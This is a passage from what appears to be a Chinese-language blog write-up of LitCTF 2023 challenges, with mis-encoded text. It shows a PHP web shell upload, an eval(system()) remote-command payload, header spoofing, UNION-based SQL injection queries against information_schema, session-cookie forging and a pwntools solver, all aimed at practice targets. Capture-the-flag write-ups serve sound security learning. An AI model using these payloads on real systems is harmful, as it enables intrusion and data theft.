]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[+[]]+[]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[+[]]+[]+[!+[]+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+[]]+[]+[+!+[]]+[]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])</span><br></pre></td></tr></table></figure><p>â€‹æŠŠè¿™ä¸ªç¼–ç è¿‡åçš„ä¸œè¥¿æ‰”åˆ°æ§åˆ¶å°ä¸­ï¼Œæ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;0f7f6477-a502-49b1-b7fe-01b2439ab608&#125;</span><br></pre></td></tr></table></figure><h2 id="7-ä½œä¸šç®¡ç†ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#7-ä½œä¸šç®¡ç†ç³»ç»Ÿ">#</a> 7ã€ä½œä¸šç®¡ç†ç³»ç»Ÿ</h2><p>â€‹å…ˆçœ‹æºç ï¼Œæºç æœ€åæ³¨é‡Šé‡Œè¯´äº†é»˜è®¤çš„è´¦å·å’Œå¯†ç éƒ½æ˜¯ adminï¼Œç›´æ¥ç™»é™†ï¼š</p><p>â€‹ä¹‹åæˆ‘ä¸å¤ç°äº†ï¼Œå­¦æ ¡æ ¡å›­ç½‘å¡æˆ‘ PHP é©¬ã€‚</p><p>â€‹å¤§è‡´è¯´ä¸‹åç»­å’‹åšï¼šç›´æ¥ä¸Šä¼  php æ–‡ä»¶ï¼Œå†…å®¹æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¸Šä¼ æˆåŠŸåç›´æ¥è¯»å–è¯¥æ–‡ä»¶ï¼Œç„¶å post ä¼ å…¥ä¸€ä¸ª cat /flag å³å¯ã€‚</p><h2 id="8-http-pro-max-plus"><a class="markdownIt-Anchor" href="#8-http-pro-max-plus">#</a> 8ã€Http pro max plus</h2><p>â€‹è¿™é¢˜â€¦ éš¾èšŒã€‚</p><p>â€‹å…ˆæ˜¯ä¸€å †è¯·æ±‚å¤´ç»•è¿‡ï¼Œç›´æ¥ä¸Šï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Chrome</span><br><span class="line">Client-Ip:127.0.0.1</span><br><span class="line">via:Clash.win</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>pornhub.com</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæç¤ºè®¿é—® /wtfwtfwtfwtf.php æ–‡ä»¶</p><p>â€‹è®¿é—®äº†ä¹‹åçœ‹æºç åˆè¦è®¿é—® /sejishikong.php æ–‡ä»¶ï¼Œä¹‹åå¾—åˆ° flagï¼š</p><blockquote><p>å†²å®Œå•¦ï¼Ÿæ‹¿ä¸Šä½ çš„ flag èµ¶ç´§èµ°</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;714b395b-2dfd-4657-8b5b-c82d04fad401&#125;</span><br></pre></td></tr></table></figure><h2 id="9-vim-yyds"><a class="markdownIt-Anchor" href="#9-vim-yyds">#</a> 9ã€Vim yydsï¼š</h2><p>â€‹è®¿é—® /.index.php.swp ä¹‹åé€šè¿‡ vim -r index.php.swp è·å–æºç ï¼ˆvim æ³„éœ²ï¼‰ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">html</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span><span class="selector-class">.vim</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">vertical-align</span>: middle;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">8rem</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span><span class="selector-class">.vim_yyds</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#50f728</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: flex-start;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h3</span><span class="selector-class">.vim_said</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#39c2ff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        br,</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">20</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vim&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&amp;pid=TechQna&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;vim_yyds&quot;</span>&gt;</span></span><br><span class="line">                Vim yyds</span><br><span class="line">            <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;vim_said&quot;</span>&gt;</span></span><br><span class="line">            é˜Ÿé‡Œå¸ˆå‚…è¯´Vimæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–è¾‘å™¨ï¼Œä¸æ¥å—åé©³</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;can_can_vim&quot;</span>&gt;</span></span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">            error_reporting(0);</span></span><br><span class="line"><span class="meta">            $password = &quot;Give_Me_Your_Flag&quot;;</span></span><br><span class="line"><span class="meta">            echo &quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">            if ($_POST[&#x27;password&#x27;] === base65_encode($password)) &#123;</span></span><br><span class="line"><span class="meta">                echo &quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">                eval(system($_POST[&#x27;cmd&#x27;]));</span></span><br><span class="line"><span class="meta">            &#125;</span></span><br><span class="line"><span class="meta">            ?&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æ³¨æ„è¿™å„¿ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="variable">$password</span> = <span class="string">&quot;Give_Me_Your_Flag&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="title function_ invoke__">base65_encode</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æŠŠ Give_Me_Your_Flag è¿›è¡Œ base64 ç¼–ç ä¹‹åå¾—åˆ°ï¼šR2l2ZV9NZV9Zb3VyX0ZsYWc=ï¼Œä¹‹å POST ä¼ å…¥ï¼Œç„¶åè¿›è¡Œ rceï¼Œpayload å¦‚ä¸‹ï¼š</p><blockquote><p>password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</p></blockquote><p>â€‹flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;550f422b-6b60-4216-828a-4521b82fe56f&#125;</span><br></pre></td></tr></table></figure><h2 id="10-è¿™æ˜¯ä»€ä¹ˆsql-æ³¨ä¸€ä¸‹"><a class="markdownIt-Anchor" href="#10-è¿™æ˜¯ä»€ä¹ˆsql-æ³¨ä¸€ä¸‹">#</a> 10ã€è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼</h2><p>â€‹å‘ç°ç»™äº†ä¸€å¥æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT username,password FROM users WHERE id = &quot;</span>.<span class="string">&#x27;((((((&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;))))))&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>â€‹ç”±äºå‰åŠéƒ¨åˆ†å­˜åœ¨å¤šä¸ª (ï¼Œå› æ­¤åè¾¹éœ€è¦å¯¹æ‹¬å·è¿›è¡Œé—­åˆï¼Œä¹‹åå’Œå¯»å¸¸çš„ sql æ³¨å…¥ä¸€æ ·ï¼š</p><p>â€‹æŸ¥æ•°æ®åº“ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>))))))<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>â€‹æŸ¥è¡¨ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>))))))<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>â€‹æŸ¥å­—æ®µåï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>))))))<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>â€‹æŸ¥ flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;d97bb244-e6e7-4ee9-b764-2a28571532e5&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>))))))<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> ctftraining.flag<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="11-flagç‚¹å‡»å°±é€"><a class="markdownIt-Anchor" href="#11-flagç‚¹å‡»å°±é€">#</a> 11ã€Flag ç‚¹å‡»å°±é€ï¼</h2><p>â€‹éšä¾¿è¾“å…¥ä¸€ä¸ª 1ï¼Œä¹‹åæç¤ºåªæœ‰ç®¡ç†å‘˜èƒ½è¿›ï¼Œåº”è¯¥æ˜¯ Cookie ä¼ªé€ ï¼Œé‚£ä¹ˆçœ‹ä¸€ä¸‹ Cookieï¼Œ</p><blockquote><p>session=eyJuYW1lIjoiMSJ9.Zmbx8g.9zpH8poegrPcOfauIe1GtO1ht64</p></blockquote><p>â€‹åº”è¯¥æ˜¯ session ä¼ªé€ ï¼ŒçŒœæµ‹ key ä¸º LitCTFï¼Œä¿®æ”¹ 1 ä¸º adminï¼Œæœ€åæ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;fdbe1619-9458-4e89-84fa-6e9b308e5507&#125;</span><br></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwnï¼š</h1><h2 id="1-åªéœ€è¦ncä¸€ä¸‹~"><a class="markdownIt-Anchor" href="#1-åªéœ€è¦ncä¸€ä¸‹~">#</a> 1ã€åªéœ€è¦ nc ä¸€ä¸‹ï½</h2><p>â€‹å‘œå‘œå‘œï¼Œè¿™ä¸ªé¢˜æˆ‘ç«Ÿç„¶æ‡µé€¼äº†ï¼Œæœ€åå‘ç°æ˜¯åœ¨ç¯å¢ƒå˜é‡ä¸­ (&gt;_&lt;)ã€‚</p><p>â€‹ç›´æ¥ nc ä¹‹å echo $FLAG å³å¯è·å¾— flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;548baafa-2de1-41c7-aafe-29b90be4f940&#125;</span><br></pre></td></tr></table></figure><h2 id="2-å£ç®—é¢˜å¡"><a class="markdownIt-Anchor" href="#2-å£ç®—é¢˜å¡">#</a> 2ã€å£ç®—é¢˜å¡</h2><p>â€‹nc è¿æ¥ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªåŠ å‡æ³•è¿ç®—ï¼ˆï¼Ÿï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@MSI:/mnt/c/Users/20820/Downloads# nc node4.anna.nssctf.cn 28007</span><br><span class="line"></span><br><span class="line"> __           ________      _________   ______       _________   ______</span><br><span class="line">/_/\         /_______/\    /________/\ /_____/\     /________/\ /_____/\</span><br><span class="line">\:\ \        \__.::._\/    \__.::.__\/ \:::__\/     \__.::.__\/ \::::_\/_</span><br><span class="line"> \:\ \          \::\ \        \::\ \    \:\ \  __      \::\ \    \:\/___/\</span><br><span class="line">  \:\ \____     _\::\ \__      \::\ \    \:\ \/_/\      \::\ \    \:::._\/</span><br><span class="line">   \:\/___/\   /__\::\__/\      \::\ \    \:\_\ \ \      \::\ \    \:\ \</span><br><span class="line">    \_____\___________________   \__\_____ \_____\______  \__\/     \_\/</span><br><span class="line">          /_____/\     /_____/\     /_____/\     /_____/\</span><br><span class="line">          \:::_:\ \    \:::_ \ \    \:::_:\ \    \:::_:\ \</span><br><span class="line">              _\:\|     \:\ \ \ \       _\:\|       /_\:\ \</span><br><span class="line"> _______     /::_/__     \:\ \ \ \     /::_/__      \::_:\ \</span><br><span class="line">/______/\    \:\____/\    \:\_\ \ \    \:\____/\    /___\:\ &#x27;</span><br><span class="line">\__::::\/     \_____\/     \_____\/     \_____\/    \______/</span><br><span class="line"></span><br><span class="line">Welcome to the LitCTF2023 Verbal Problem Card!</span><br><span class="line">You will be presented with 100 addition and subtraction problems.</span><br><span class="line">Your goal is to answer all of them correctly to get the flag!</span><br><span class="line">if you wrong, you will be kicked out of the game.</span><br><span class="line">Good luck &amp; Have fun!</span><br></pre></td></tr></table></figure><p>â€‹æ¨æµ‹éœ€è¦åŠ å‡åˆ°ä¸€å®šæ•°ç›®æ‰ä¼šå‡º flagï¼Œè¯•è¯•å§ï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28007</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Have fun!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;What is&quot;</span>)</span><br><span class="line">    key = io.recvuntil(<span class="string">b&quot;?&quot;</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="built_in">str</span>(<span class="built_in">eval</span>(key[:-<span class="number">1</span>]))</span><br><span class="line">    ])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">eval</span>(key[:-<span class="number">1</span>]))</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>â€‹æœ€åå¾—åˆ° flagï¼šCongratulations! Hereâ€™s your flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;757d9dc8-d946-4f97-9370-63876e41aeaf&#125;</span><br></pre></td></tr></table></figure><h2 id="3-ç‹ ç‹ çš„æº¢å‡ºæ¶…~"><a 